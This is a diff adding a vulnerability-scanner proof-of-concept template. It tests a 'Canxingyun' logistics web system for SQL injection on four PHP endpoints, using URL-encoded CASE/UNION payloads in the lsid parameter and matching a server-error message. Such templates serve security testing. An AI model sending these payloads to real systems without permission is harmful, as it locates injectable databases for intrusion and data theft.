@@ -1,0 +1,48 @@
+name: poc-yaml-canxingyun-not_out_depot-shelflife-not_finish-stock-sql
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /logistics/home_warning/php/not_out_depot.php?do=getList&lsid=(SELECT%20(CASE%20WHEN%20(5630=5631)%20THEN%202%20ELSE%20(SELECT%207330%20UNION%20SELECT%203010)%20END))
+      headers:
+        User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)
+    expression: response.status == 200 && response.body.bcontains(b'服务器内部错误，请与管理员联系，谢谢')
+
+  r1:
+    request:
+      method: GET
+      path: /logistics/home_warning/php/shelflife.php?do=getList&lsid=%28SELECT+%28CASE+WHEN+%289764%3D9765%29+THEN+%27%27+ELSE+%28SELECT+7700+UNION+SELECT+3389%29+END%29%29
+      headers:
+        User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)
+    expression: response.status == 200 && response.body.bcontains(b'服务器内部错误，请与管理员联系，谢谢')
+
+  r2:
+    request:
+      method: GET
+      path: /logistics/home_warning/php/not_finish.php?do=getList&lsid=%28SELECT+%28CASE+WHEN+%289764%3D9765%29+THEN+%27%27+ELSE+%28SELECT+7700+UNION+SELECT+3389%29+END%29%29
+      headers:
+        User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)
+    expression: response.status == 200 && response.body.bcontains(b'服务器内部错误，请与管理员联系，谢谢')  
+
+  r3:
+    request:
+      method: GET
+      path: /logistics/home_warning/php/stock.php?do=getList&lsid=%28SELECT+%28CASE+WHEN+%289764%3D9765%29+THEN+%27%27+ELSE+%28SELECT+7700+UNION+SELECT+3389%29+END%29%29
+      headers:
+        User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)
+    expression: response.status == 200 && response.body.bcontains(b'服务器内部错误，请与管理员联系，谢谢') 
+
+expression: r0() || r1 () || r2() || r3()
+ 
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/140541777
+
+
+
+
